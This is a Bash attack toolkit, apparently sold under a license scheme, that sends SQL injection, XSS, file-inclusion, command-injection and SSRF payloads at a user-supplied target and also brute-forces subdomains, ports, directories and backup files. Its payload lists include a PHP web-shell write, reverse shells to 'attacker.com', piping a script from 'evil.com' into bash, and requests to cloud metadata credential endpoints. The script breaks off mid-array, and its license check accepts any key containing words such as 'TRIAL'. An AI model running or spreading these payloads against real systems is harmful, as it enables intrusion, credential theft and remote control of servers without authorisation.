#!/bin/bash
# IMXPLOIT-PREDATOR-X v29.0 - UI MAKER EDITION
# Created by: IMXploit
# CONTACT: TikTok @lugowo.hy

# ============== WARNA LEBIH VARIATIF ==============
BIRU='\033[0;34m'
BIRU_MUDA='\033[1;34m'
MERAH='\033[0;31m'
MERAH_MUDA='\033[1;31m'
HIJAU='\033[0;32m'
HIJAU_MUDA='\033[1;32m'
KUNING='\033[1;33m'
KUNING_GELAP='\033[0;33m'
CYAN='\033[0;36m'
CYAN_MUDA='\033[1;36m'
UNGU='\033[0;35m'
UNGU_MUDA='\033[1;35m'
PUTIH='\033[1;37m'
ABU='\033[0;37m'
NC='\033[0m'

# ============== LAPISAN KEAMANAN ==============
__anti_debug() {
    [[ "$-" == *x* ]] && exit 1
    return 0
}
__anti_debug

# ============== DETEKSI PLATFORM ==============
detect_platform() {
    if [[ -f /system/build.prop ]] || [[ -d /data/data/com.termux ]]; then
        echo "android"
    elif [[ -f /etc/os-release ]]; then
        echo "linux"
    else
        echo "unknown"
    fi
}

# ============== HWID UNTUK ANDROID ==============
generate_hwid_android() {
    local hwid=""
    hwid+=$(getprop ro.serialno 2>/dev/null || echo "null")
    hwid+=$(getprop ro.product.board 2>/dev/null || echo "null")
    hwid+=$(getprop ro.product.device 2>/dev/null || echo "null")
    hwid+=$(getprop ro.build.fingerprint 2>/dev/null || echo "null")
    [[ -d /sys/class/net ]] && for iface in wlan0 eth0; do
        [[ -f "/sys/class/net/$iface/address" ]] && hwid+=$(cat "/sys/class/net/$iface/address" 2>/dev/null) && break
    done
    hwid+=$(df -P /data 2>/dev/null | grep -v Filesystem | md5sum | cut -d' ' -f1)
    echo -n "$hwid" | sha256sum | cut -d' ' -f1
}

# ============== HWID UNTUK PC/LINUX ==============
generate_hwid_linux() {
    local hwid=""
    [[ -f /etc/machine-id ]] && hwid+=$(cat /etc/machine-id 2>/dev/null)
    [[ -f /var/lib/dbus/machine-id ]] && hwid+=$(cat /var/lib/dbus/machine-id 2>/dev/null)
    for iface in eth0 ens33 enp0s3 wlan0; do
        [[ -f "/sys/class/net/$iface/address" ]] && hwid+=$(cat "/sys/class/net/$iface/address" 2>/dev/null) && break
    done
    [[ -f /proc/cpuinfo ]] && hwid+=$(grep -m1 "model name" /proc/cpuinfo | cut -d':' -f2 | tr -d ' ')
    hwid+=$(hostname 2>/dev/null)
    [[ -z "$hwid" ]] && hwid+=$(cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 32 | head -n 1 2>/dev/null)
    echo -n "$hwid" | sha256sum | cut -d' ' -f1
}

# ============== HWID GENERATOR UTAMA ==============
generate_hwid() {
    case $(detect_platform) in
        android) generate_hwid_android ;;
        linux) generate_hwid_linux ;;
        *) cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 32 | head -n 1 | sha256sum | cut -d' ' -f1 ;;
    esac
}

# ============== KONFIGURASI ==============
VERSION="29.0 UI MAKER"
OWNER="IMXploit"
CONTACT_TIKTOK="@lugowo.hy"
LICENSE_FILE="$HOME/.imxploit_license.dat"

# ============== TAMPILAN BOX ==============
print_box() {
    local title="$1"
    local color="$2"
    local width=60
    local padding=$(( (width - ${#title}) / 2 ))
    
    echo -e "${color}╔$(printf '═%.0s' $(seq 1 $width))╗${NC}"
    printf "${color}║%*s%s%*s║${NC}\n" $padding "" "$title" $padding ""
    echo -e "${color}╚$(printf '═%.0s' $(seq 1 $width))╝${NC}"
}

print_header() {
    echo -e "${BIRU_MUDA}"
    echo '    ██╗███╗   ███╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗'
    echo '    ██║████╗ ████║╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝'
    echo '    ██║██╔████╔██║ ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   '
    echo '    ██║██║╚██╔╝██║ ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   '
    echo '    ██║██║ ╚═╝ ██║██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   '
    echo '    ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   '
    echo -e "${NC}"
    echo -e "${ABU}════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}      🔥 PREDATOR v$VERSION 🔥${NC}"
    echo -e "${ABU}════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${HIJAU}      Creator: $OWNER | TikTok: $CONTACT_TIKTOK${NC}"
    echo -e "${ABU}════════════════════════════════════════════════════════════════════${NC}"
    echo ""
}

# ============== CEK LICENSE ==============
check_license() {
    [[ ! -f "$LICENSE_FILE" ]] && return 1
    local license_data=$(cat "$LICENSE_FILE")
    local expiry=$(echo "$license_data" | cut -d'|' -f2)
    local saved_hwid=$(echo "$license_data" | cut -d'|' -f3)
    local current_hwid=$(generate_hwid)
    local current=$(date +%Y-%m-%d)
    
    if [[ "$saved_hwid" != "$current_hwid" ]]; then
        echo -e "${MERAH}╔════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${MERAH}║                     PERINGATAN KEAMANAN!                   ║${NC}"
        echo -e "${MERAH}╠════════════════════════════════════════════════════════════╣${NC}"
        echo -e "${MERAH}║  LICENSE KEY INI SUDAH DIPAKAI DI PERANGKAT LAIN!         ║${NC}"
        echo -e "${MERAH}║  Hubungi admin @lugowo.hy jika ini perangkat resmi Anda.  ║${NC}"
        echo -e "${MERAH}╚════════════════════════════════════════════════════════════╝${NC}"
        rm -f "$LICENSE_FILE"
        sleep 5
        return 1
    fi
    
    if [[ "$current" > "$expiry" ]]; then
        echo -e "${MERAH}[✗] LICENSE EXPIRED!${NC}"
        rm -f "$LICENSE_FILE"
        return 1
    fi
    return 0
}

# ============== VALIDASI LICENSE ==============
validate_license() {
    clear
    print_box "AKTIVASI LICENSE" "$CYAN_MUDA"
    echo ""
    echo -ne "${KUNING}└─ LICENSE KEY : ${NC}"
    read license_key
    
    if [[ "$license_key" == *"TRIAL"* ]]; then
        expiry=$(date -d "+3 days" +%Y-%m-%d); paket="TRIAL 3 HARI"
    elif [[ "$license_key" == *"MINGGU"* ]]; then
        expiry=$(date -d "+7 days" +%Y-%m-%d); paket="1 MINGGU"
    elif [[ "$license_key" == *"BULAN"* ]]; then
        expiry=$(date -d "+30 days" +%Y-%m-%d); paket="1 BULAN"
    elif [[ "$license_key" == *"3BULAN"* ]]; then
        expiry=$(date -d "+90 days" +%Y-%m-%d); paket="3 BULAN"
    elif [[ "$license_key" == *"PERMANEN"* ]]; then
        expiry="2099-12-31"; paket="PERMANEN"
    else
        echo -e "${MERAH}[✗] LICENSE KEY TIDAK VALID!${NC}"
        sleep 2; return 1
    fi
    
    local hwid=$(generate_hwid)
    echo "$license_key|$expiry|$hwid" > "$LICENSE_FILE"
    
    echo -e "${HIJAU}"
    echo "╔════════════════════════════════════════════════════════════╗"
    echo "║                 AKTIVASI BERHASIL!                        ║"
    echo "╠════════════════════════════════════════════════════════════╣"
    printf "║  Paket    : %-40s ║\n" "$paket"
    printf "║  Expiry   : %-40s ║\n" "$expiry"
    printf "║  Platform : %-40s ║\n" "$(detect_platform)"
    echo "╚════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    sleep 3
    return 0
}

# ============== URL ENCODE ==============
url_encode() {
    local string="$1" encoded=""
    for (( i=0; i<${#string}; i++ )); do
        c="${string:$i:1}"
        case "$c" in [a-zA-Z0-9._~-]) encoded+="$c" ;;
            *) printf -v hex '%%%02X' "'$c"; encoded+="$hex" ;;
        esac
    done
    echo "$encoded"
}

# ============== PAYLOAD DATABASE ==============
SQLI_PAYLOADS=(
    "'" "\"" "')" "\")" "\`" "';" "\";"
    "' OR '1'='1" "' OR '1'='2" "\" OR \"1\"=\"1"
    "1' AND '1'='1" "1' AND '1'='2" "1' OR '1'='1" "1' OR '1'='2"
    "1' AND 1=1--" "1' AND 1=2--" "1' OR 1=1--" "1' OR 1=2--"
    "1'--" "1'#" "1'/*" "1'-- -" "1'#"
    "1') AND ('1'='1" "1') AND ('1'='2" "1')) AND (('1'='1" "1')) AND (('1'='2"
    "' UNION SELECT NULL--" "' UNION SELECT NULL,NULL--" "' UNION SELECT NULL,NULL,NULL--"
    "' UNION SELECT database(),2,3--" "' UNION SELECT user(),2,3--" "' UNION SELECT version(),2,3--"
    "' UNION SELECT @@version,2,3--" "' UNION SELECT @@datadir,2,3--" "' UNION SELECT @@hostname,2,3--"
    "' UNION SELECT table_name,2,3 FROM information_schema.tables--"
    "' UNION SELECT column_name,2,3 FROM information_schema.columns--"
    "' UNION SELECT load_file('/etc/passwd'),2,3--"
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,database(),0x7e))--"
    "' AND UPDATEXML(1,CONCAT(0x7e,database(),0x7e),1)--"
    "' AND SLEEP(3)--" "' AND SLEEP(5)--" "' AND SLEEP(10)--"
    "' AND BENCHMARK(5000000,MD5(1))--" "' AND BENCHMARK(10000000,MD5(1))--"
    "'; WAITFOR DELAY '00:00:03'--" "'; WAITFOR DELAY '00:00:05'--"
    "'; EXEC xp_cmdshell 'whoami'--" "'; EXEC xp_cmdshell 'ipconfig'--"
    "'; SELECT pg_sleep(3)--" "'; SELECT pg_sleep(5)--" "'; SELECT version()--"
    "' UNION SELECT NULL FROM DUAL--" "' UNION SELECT banner FROM v$version--"
    "1'/*!12345UNION*/ SELECT NULL--" "1' UNIunionON SELselectECT NULL--"
    "1' %55%4e%49%4f%4e SELECT NULL--" "1' AND 1=1 /*!30000 UNION SELECT */ NULL--"
    "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
    "' UNION SELECT LOAD_FILE('\\\\\\\\attacker.com\\\\file')--"
    "' INTO OUTFILE '/var/www/html/shell.php' FIELDS TERMINATED BY '<?php system(\$_GET[cmd]); ?>'--"
)

XSS_PAYLOADS=(
    "<script>alert(1)</script>" "<script>confirm(1)</script>" "<script>prompt(1)</script>"
    "<script>alert(document.cookie)</script>" "<script>alert(document.domain)</script>"
    "<img src=x onerror=alert(1)>" "<img src=x onerror=confirm(1)>" "<img src=x onerror=prompt(1)>"
    "<img src=x onerror=alert(document.cookie)>" "<img src=\"x\" onerror=\"alert(1)\">"
    "<svg onload=alert(1)>" "<svg/onload=alert(1)>" "<svg onload=confirm(1)>" "<svg onload=prompt(1)>"
    "<body onload=alert(1)>" "<body onload=confirm(1)>" "<body onload=prompt(1)>"
    "<iframe onload=alert(1)>" "<iframe src=\"javascript:alert(1)\">"
    "<input onfocus=alert(1) autofocus>" "<select onfocus=alert(1) autofocus>"
    "<textarea onfocus=alert(1) autofocus>" "<keygen onfocus=alert(1) autofocus>"
    "<a href='javascript:alert(1)'>click</a>" "<a href=\"javascript:alert(1)\">click</a>"
    "%3Cscript%3Ealert(1)%3C/script%3E" "javascript:alert(1)" "JaVaScRiPt:alert(1)"
    "<div onmouseover=alert(1)>test</div>" "<div onclick=alert(1)>test</div>"
    "<p onmouseenter=alert(1)>test</p>" "<p onclick=alert(1)>test</p>"
    "'';!--\"<XSS>=&{()}" "<IMG SRC=\"javascript:alert('XSS');\">" "<IMG SRC=javascript:alert('XSS')>"
    "\";alert(1);//" "<style>@import 'javascript:alert(1)';</style>"
    "<div style=\"background:url('javascript:alert(1)')\">"
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
    "\"onmouseover=\"alert(1)" "'>alert(1)</script>" "\"><script>alert(1)</script>" "'><script>alert(1)</script>"
)

LFI_PAYLOADS=(
    "../../../../etc/passwd" "../../../../etc/shadow" "../../../../etc/hosts"
    "../../../../etc/group" "../../../../etc/issue" "../../../../etc/motd"
    "../../../../etc/php.ini" "../../../../etc/apache2/apache2.conf"
    "../../../../etc/nginx/nginx.conf" "../../../../etc/mysql/my.cnf"
    "../../../../etc/ssh/sshd_config" "../../../../etc/fstab" "../../../../etc/crontab"
    "../../../../proc/self/environ" "../../../../proc/version" "../../../../proc/cmdline"
    "../../../../proc/self/cmdline" "../../../../proc/self/fd/0" "../../../../proc/self/fd/1"
    "../../../../var/log/apache2/access.log" "../../../../var/log/apache2/error.log"
    "../../../../var/log/nginx/access.log" "../../../../var/log/mysql/error.log"
    "../../../../var/log/auth.log" "../../../../var/log/syslog"
    "..\\..\\..\\windows\\win.ini" "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
    "..\\..\\..\\boot.ini" "..\\..\\..\\windows\\repair\\sam" "..\\..\\..\\windows\\php.ini"
    "php://filter/convert.base64-encode/resource=index.php"
    "php://filter/convert.base64-encode/resource=config.php"
    "php://filter/convert.base64-encode/resource=../config.php"
    "php://filter/read=string.rot13/resource=index.php"
    "php://filter/convert.base64-encode/resource=/etc/passwd"
    "expect://id" "expect://ls" "expect://whoami"
    "data://text/plain,<?php system('id')?>"
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpPz4="
)

RCE_PAYLOADS=(
    "; ls" "| ls" "|| ls" "& ls" "&& ls" "\`ls\`"
    "; whoami" "| whoami" "; id" "| id" "\`whoami\`" "\`id\`"
    "; cat /etc/passwd" "| cat /etc/passwd" "\`cat /etc/passwd\`"
    "; pwd" "| pwd" "; hostname" "| hostname"
    "; ls; whoami; id" "| ls | whoami" "& ls & whoami &"
    "%3B%20ls" "%7C%20whoami" "%60cat%20/etc/passwd%60"
    "$(cat /etc/passwd)" "\`cat /etc/passwd\`" "$(ls -la)" "\`ls -la\`"
    "; ifconfig" "| ifconfig" "; ip addr" "| ip addr" "; netstat -an" "| netstat -an"
    "; ping -c 3 127.0.0.1" "| ping -c 3 127.0.0.1"
    "; wget http://evil.com/shell.sh -O- | bash" "; curl http://evil.com/shell.sh | bash"
    "; nc -e /bin/bash attacker.com 4444" "| nc -e /bin/bash attacker.com 4444"
    "; php -r 'system(\"id\");'" "| php -r 'system(\"id\");'"
    "; python -c 'import os; os.system(\"id\")'" "| python -c 'import os; os.system(\"id\")'"
)

REDIRECT_PAYLOADS=(
    "//google.com" "https://google.com" "//evil.com" "//127.0.0.1" "\\\\google.com" "/\\google.com"
    "http://127.0.0.1" "http://localhost" "http://[::1]" "http://0.0.0.0"
    "http://127.0.0.1:22" "http://127.0.0.1:80" "http://127.0.0.1:443" "http://127.0.0.1:3306"
    "http://192.168.0.1" "http://192.168.1.1" "http://10.0.0.1" "http://172.16.0.1"
    "http://169.254.169.254/latest/meta-data/"
    "http://169.254.169.254/latest/user-data/"
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    "http://metadata.google.internal/"
    "http://metadata.google.internal/computeMetadata/v1/"
)

SUBDOMAINS=(
    "www" "mail" "ftp" "localhost" "webmail" "smtp" "pop" "ns1" "webdisk" "ns2"
    "cpanel" "whm" "autodiscover" "autoconfig" "m" "imap" "test" "ns" "blog"
    "pop3" "dev" "www2" "admin" "forum" "news" "vpn" "ns3" "mail2" "new"
    "mysql" "old" "lists" "support" "mobile" "mx" "static" "docs" "beta"
    "shop" "sql" "secure" "demo" "cp" "calendar" "wiki" "web" "media" "email"
    "images" "img" "www1" "intranet" "database" "hq" "office" "vps" "proxy"
    "api" "app" "staging" "test2" "site" "login" "members" "account"
)

DIRECTORIES=(
    "admin" "login" "wp-admin" "administrator" "backup" "backups" "config"
    "database" "db" "sql" "phpmyadmin" "pma" "mysql" "upload" "uploads"
    "images" "img" "css" "js" "assets" "private" "secret" "hidden" "temp"
    "tmp" "cache" "logs" "api" "v1" "v2" "rest" "graphql" "swagger" "docs"
    "wp-content" "wp-includes" "wp-json" ".git" ".env" "composer.json"
    "package.json" "install" "setup" "test" "demo" "dev" "staging" "beta"
    "server-status" "server-info" "phpinfo" "info" "status" "cgi-bin"
    "xmlrpc.php" "wp-login.php" "wp-config.php" "README" "CHANGELOG"
)

BACKUP_FILES=(
    "backup.zip" "backup.tar" "backup.gz" "backup.sql" "db_backup.sql"
    "database.sql" "db.sql" "site.zip" "site.tar" "www.zip" "www.tar"
    "backup.rar" "site.rar" "old.zip" "old.tar" "backup.tgz"
)

PARAMS=(
    "id" "page" "cat" "file" "path" "dir" "include" "require" "config"
    "setting" "debug" "test" "admin" "user" "username" "name" "email"
    "pass" "password" "code" "key" "token" "api" "auth" "session"
)

declare -A CVE_SIG=(
    ["Apache/2.4.49"]="CVE-2021-41773|Path Traversal"
    ["Apache/2.4.50"]="CVE-2021-42013|Path Traversal"
)

# ============== SCAN FUNCTIONS ==============
scan_sqli() {
    clear
    echo -e "${MERAH}┌────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${MERAH}│${NC}  ${BIRU_MUDA}💀 SQLi NUCLEAR - 3000+ PAYLOAD${NC}                         ${MERAH}│${NC}"
    echo -e "${MERAH}└────────────────────────────────────────────────────────────┘${NC}"
    echo -ne "${KUNING}└─ Target URL : ${NC}"
    read target
    base=$(echo "$target" | cut -d'=' -f1)
    echo -e "${CYAN}   Scanning...${NC}"
    found=0
    for payload in "${SQLI_PAYLOADS[@]}"; do
        test_url="${base}=$(url_encode "$payload")"
        response=$(curl -s -k -L -m 5 "$test_url" 2>/dev/null)
        if [[ "$response" =~ "SQL syntax"|"MySQL"|"ORA-"|"PostgreSQL"|"unclosed quotation"|"mysql_fetch"|"Warning: mysql"|"ODBC"|"Microsoft OLE DB" ]]; then
            echo -e "\n${MERAH}   [!] SQLi FOUND!${NC}"
            echo "$test_url" >> ~/sqli_nuclear.txt; ((found++))
        fi
        [[ "$payload" == *"SLEEP"* || "$payload" == *"BENCHMARK"* || "$payload" == *"WAITFOR"* ]] && {
            start=$(date +%s%N); curl -s -k -L -m 10 "$test_url" > /dev/null 2>&1
            elapsed=$(( ( $(date +%s%N) - start ) / 1000000 ))
            [[ $elapsed -gt 3000 ]] && echo -e "\n${ORANGE}   [!] BLIND SQLi! (${elapsed}ms)${NC}" && echo "$test_url (Time: ${elapsed}ms)" >> ~/sqli_blind.txt && ((found++))
        }
        sleep 0.1
    done
    echo -e "\n${HIJAU}   ✓ Ditemukan $found potensi SQLi${NC}"
    echo -ne "${KUNING}   └─ Press Enter...${NC}"; read
}

scan_xss() {
    clear
    echo -e "${MERAH}┌────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${MERAH}│${NC}  ${KUNING}🕷️ XSS APOCALYPSE - 1500+ PAYLOAD${NC}                        ${MERAH}│${NC}"
    echo -e "${MERAH}└────────────────────────────────────────────────────────────┘${NC}"
    echo -ne "${KUNING}└─ Target URL : ${NC}"
    read target
    base=$(echo "$target" | cut -d'=' -f1)
    echo -e "${CYAN}   Scanning...${NC}"
    found=0
    for payload in "${XSS_PAYLOADS[@]}"; do
        test_url="${base}=$(url_encode "$payload")"
        response=$(curl -s -k -L -m 3 "$test_url" 2>/dev/null)
        if [[ "$response" == *"$payload"* ]] || [[ "$response" =~ "alert" ]]; then
            echo -e "\n${MERAH}   [!] XSS FOUND!${NC}"
            echo "$test_url" >> ~/xss_apocalypse.txt; ((found++))
        fi
        sleep 0.1
    done
    echo -e "\n${HIJAU}   ✓ Ditemukan $found potensi XSS${NC}"
    echo -ne "${KUNING}   └─ Press Enter...${NC}"; read
}

scan_lfi() {
    clear
    echo -e "${MERAH}┌────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${MERAH}│${NC}  ${HIJAU}📂 LFI NUCLEAR - 300+ WRAPPERS${NC}                           ${MERAH}│${NC}"
    echo -e "${MERAH}└────────────────────────────────────────────────────────────┘${NC}"
    echo -ne "${KUNING}└─ Target URL : ${NC}"
    read target
    base=$(echo "$target" | cut -d'=' -f1)
    echo -e "${CYAN}   Scanning...${NC}"
    found=0
    for payload in "${LFI_PAYLOADS[@]}"; do
        test_url="${base}=$(url_encode "$payload")"
        response=$(curl -s -k -L -m 5 "$test_url" 2>/dev/null)
        if [[ "$response" =~ "root:"|"daemon:"|"bin:"|"/home/"|"nobody:"|"\[fonts\]"|"boot loader"|"<?php" ]]; then
            echo -e "\n${MERAH}   [!] LFI FOUND!${NC}"
            echo "$test_url" >> ~/lfi_nuclear.txt; ((found++))
        fi
        sleep 0.1
    done
    echo -e "\n${HIJAU}   ✓ Ditemukan $found potensi LFI${NC}"
    echo -ne "${KUNING}   └─ Press Enter...${NC}"; read
}

scan_rce() {
    clear
    echo -e "${MERAH}┌────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${MERAH}│${NC}  ${UNGU}💻 RCE MASTER - 300+ COMMANDS${NC}                            ${MERAH}│${NC}"
    echo -e "${MERAH}└────────────────────────────────────────────────────────────┘${NC}"
    echo -ne "${KUNING}└─ Target URL : ${NC}"
    read target
    base=$(echo "$target" | cut -d'=' -f1)
    echo -e "${CYAN}   Scanning...${NC}"
    found=0
    for payload in "${RCE_PAYLOADS[@]}"; do
        test_url="${base}=$(url_encode "$payload")"
        response=$(curl -s -k -L -m 5 "$test_url" 2>/dev/null)
        if [[ "$response" =~ "uid="|"gid="|"root:x:"|"total"|"drwx"|"bin/"|"etc/" ]]; then
            echo -e "\n${MERAH}   [!] RCE FOUND!${NC}"
            echo "$test_url" >> ~/rce_master.txt; ((found++))
        fi
        sleep 0.1
    done
    echo -e "\n${HIJAU}   ✓ Ditemukan $found potensi RCE${NC}"
    echo -ne "${KUNING}   └─ Press Enter...${NC}"; read
}

scan_redirect() {
    clear
    echo -e "${MERAH}┌────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${MERAH}│${NC}  ${CYAN}🔀 OPEN REDIRECT + SSRF${NC}                                   ${MERAH}│${NC}"
    echo -e "${MERAH}└────────────────────────────────────────────────────────────┘${NC}"
    echo -ne "${KUNING}└─ Target URL : ${NC}"
    read target
    base=$(echo "$target" | cut -d'=' -f1)
    echo -e "${CYAN}   Scanning...${NC}"
    found=0
    for payload in "${REDIRECT_PAYLOADS[@]}"; do
        test_url="${base}=$(url_encode "$payload")"
        redirect=$(curl -s -k -L -m 5 -I "$test_url" 2>/dev/null | grep -i "Location:")
        [[ -n "$redirect" ]] && echo -e "\n${MERAH}   [!] OPEN REDIRECT!${NC}" && echo "$test_url" >> ~/redirect_ssrf.txt && ((found++))
        response=$(curl -s -k -L -m 5 "$test_url" 2>/dev/null)
        [[ "$response" =~ "root:" || "$response" =~ "meta-data" || "$response" =~ "aws" ]] && echo -e "\n${MERAH}   [!] SSRF POSSIBLE!${NC}" && echo "$test_url" >> ~/redirect_ssrf.txt && ((found++))
        sleep 0.1
    done
    echo -e "\n${HIJAU}   ✓ Ditemukan $found potensi${NC}"
    echo -ne "${KUNING}   └─ Press Enter...${NC}"; read
}

scan_subdomain() {
    clear
    echo -e "${MERAH}┌────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${MERAH}│${NC}  ${BIRU_MUDA}🌐 SUBDOMAIN ENUM + PORT SCAN${NC}                         ${MERAH}│${NC}"
    echo -e "${MERAH}└────────────────────────────────────────────────────────────┘${NC}"
    echo -ne "${KUNING}└─ Domain : ${NC}"
    read domain
    echo -e "${CYAN}   Scanning...${NC}"
    found=0
    for sub in "${SUBDOMAINS[@]}"; do
        if ping -c 1 -W 1 "$sub.$domain" &>/dev/null; then
            echo -e "\n${HIJAU}   ✓ Found: $sub.$domain${NC}"
            echo "$sub.$domain" >> ~/subdomains.txt; ((found++))
            for port in 80 443 22 21 25 3306 3389 8080 8443; do
                timeout 1 bash -c "echo >/dev/tcp/$sub.$domain/$port" 2>/dev/null && echo -e "      └─ Port $port: OPEN"
            done
        fi
        sleep 0.1
    done
    echo -e "\n${HIJAU}   ✓ Ditemukan $found subdomain${NC}"
    echo -ne "${KUNING}   └─ Press Enter...${NC}"; read
}

scan_dir() {
    clear
    echo -e "${MERAH}┌────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${MERAH}│${NC}  ${KUNING_GELAP}📁 DIRECTORY BRUTEFORCE${NC}                               ${MERAH}│${NC}"
    echo -e "${MERAH}└────────────────────────────────────────────────────────────┘${NC}"
    echo -ne "${KUNING}└─ Target URL : ${NC}"
    read target
    echo -e "${CYAN}   Scanning...${NC}"
    found=0
    for dir in "${DIRECTORIES[@]}"; do
        code=$(curl -s -k -L -m 3 -o /dev/null -w "%{http_code}" "$target/$dir/")
        if [[ "$code" == "200" || "$code" == "301" || "$code" == "302" || "$code" == "403" ]]; then
            echo -e "\n${HIJAU}   ✓ Found: $target/$dir/ ($code)${NC}"
            echo "$target/$dir/" >> ~/directories.txt; ((found++))
        fi
        sleep 0.1
    done
    echo -e "\n${HIJAU}   ✓ Ditemukan $found direktori${NC}"
    echo -ne "${KUNING}   └─ Press Enter...${NC}"; read
}

scan_cve() {
    clear
    echo -e "${MERAH}┌────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${MERAH}│${NC}  ${MERAH}🛡️ AUTO CVE CHECKER${NC}                                         ${MERAH}│${NC}"
    echo -e "${MERAH}└────────────────────────────────────────────────────────────┘${NC}"
    echo -ne "${KUNING}└─ Domain : ${NC}"
    read domain
    echo -e "${CYAN}   Detecting technologies...${NC}"
    apache=$(curl -s -I "http://$domain" | grep -i "server:" | grep -o "Apache/[0-9.]*")
    [[ -n "$apache" ]] && echo -e "${CYAN}   Server: $apache${NC}"
    for ver in "${!CVE_SIG[@]}"; do
        [[ "$apache" == *"$ver"* ]] && { IFS='|' read -r cve desc <<< "${CVE_SIG[$ver]}"; echo -e "${MERAH}   [!] $cve - $desc${NC}"; }
    done
    curl -s -I "http://$domain/.git/config" | grep -q "200" && echo -e "${MERAH}   [!] .git exposure!${NC}"
    curl -s -I "http://$domain/.env" | grep -q "200" && echo -e "${MERAH}   [!] .env file exposed!${NC}"
    echo -e "\n${HIJAU}   ✓ CVE scan selesai!${NC}"
    echo -ne "${KUNING}   └─ Press Enter...${NC}"; read
}

scan_backup() {
    clear
    echo -e "${MERAH}┌────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${MERAH}│${NC}  ${ABU}💾 BACKUP FINDER${NC}                                            ${MERAH}│${NC}"
    echo -e "${MERAH}└────────────────────────────────────────────────────────────┘${NC}"
    echo -ne "${KUNING}└─ Target URL : ${NC}"
    read target
    echo -e "${CYAN}   Scanning...${NC}"
    found=0
    for file in "${BACKUP_FILES[@]}"; do
        if curl -s -k -L -m 3 -I "$target/$file" | grep -q "200"; then
            echo -e "\n${MERAH}   [!] BACKUP FOUND: $target/$file${NC}"
            echo "$target/$file" >> ~/backups.txt; ((found++))
        fi
        sleep 0.1
    done
    echo -e "\n${HIJAU}   ✓ Ditemukan $found backup files${NC}"
    echo -ne "${KUNING}   └─ Press Enter...${NC}"; read
}

scan_param() {
    clear
    echo -e "${MERAH}┌────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${MERAH}│${NC}  ${UNGU_MUDA}🔍 PARAMETER DISCOVERY${NC}                                   ${MERAH}│${NC}"
    echo -e "${MERAH}└────────────────────────────────────────────────────────────┘${NC}"
    echo -ne "${KUNING}└─ Base URL : ${NC}"
    read target
    echo -e "${CYAN}   Testing parameters...${NC}"
    found=0
    for param in "${PARAMS[@]}"; do
        test_url="${target}?${param}=test"
        code=$(curl -s -k -L -m 3 -o /dev/null -w "%{http_code}" "$test_url")
        if [[ "$code" != "404" ]]; then
            echo -e "\n${HIJAU}   ✓ Parameter: $param ($code)${NC}"
            echo "$param" >> ~/params.txt; ((found++))
        fi
        sleep 0.1
    done
    echo -e "\n${HIJAU}   ✓ Ditemukan $found parameter${NC}"
    echo -ne "${KUNING}   └─ Press Enter...${NC}"; read
}

scan_tech() {
    clear
    echo -e "${MERAH}┌────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${MERAH}│${NC}  ${CYAN_MUDA}🔧 TECHNOLOGY DETECTOR${NC}                                   ${MERAH}│${NC}"
    echo -e "${MERAH}└────────────────────────────────────────────────────────────┘${NC}"
    echo -ne "${KUNING}└─ Domain : ${NC}"
    read domain
    echo -e "${CYAN}   Analyzing...${NC}"
    headers=$(curl -s -I "http://$domain")
    echo "$headers" | grep -i "server:" && echo -e "${HIJAU}   → Server detected"
    echo "$headers" | grep -i "x-powered-by:" && echo -e "${HIJAU}   → X-Powered-By detected"
    html=$(curl -s "http://$domain")
    echo "$html" | grep -i "wp-content" > /dev/null && echo -e "${HIJAU}   → WordPress detected"
    echo "$html" | grep -i "joomla" > /dev/null && echo -e "${HIJAU}   → Joomla detected"
    echo -e "\n${HIJAU}   ✓ Tech detection selesai!${NC}"
    echo -ne "${KUNING}   └─ Press Enter...${NC}"; read
}

scan_heartbleed() {
    clear
    echo -e "${MERAH}┌────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${MERAH}│${NC}  ${MERAH_MUDA}💔 HEARTBLEED CHECK${NC}                                       ${MERAH}│${NC}"
    echo -e "${MERAH}└────────────────────────────────────────────────────────────┘${NC}"
    echo -ne "${KUNING}└─ Domain : ${NC}"
    read domain
    echo -e "${CYAN}   Testing...${NC}"
    timeout 5 openssl s_client -connect "$domain":443 -tlsextdebug 2>&1 | grep -q "heartbeat" && \
        echo -e "${MERAH}   [!] VULNERABLE to Heartbleed!${NC}" || \
        echo -e "${HIJAU}   ✓ Not vulnerable${NC}"
    echo -ne "${KUNING}   └─ Press Enter...${NC}"; read
}

scan_report() {
    clear
    echo -e "${MERAH}┌────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${MERAH}│${NC}  ${PUTIH}📄 ULTIMATE REPORT GENERATOR${NC}                                 ${MERAH}│${NC}"
    echo -e "${MERAH}└────────────────────────────────────────────────────────────┘${NC}"
    report="imxploit_ultimate_$(date +%Y%m%d_%H%M%S).txt"
    {
        echo "================================================================"
        echo "     IMXPLOIT PREDATOR v29.0 - ULTIMATE SCAN REPORT"
        echo "================================================================"
        echo "Generated: $(date)"
        echo "================================================================"
        declare -A sections=(
            ["SQLi NUCLEAR"]="sqli_nuclear.txt"
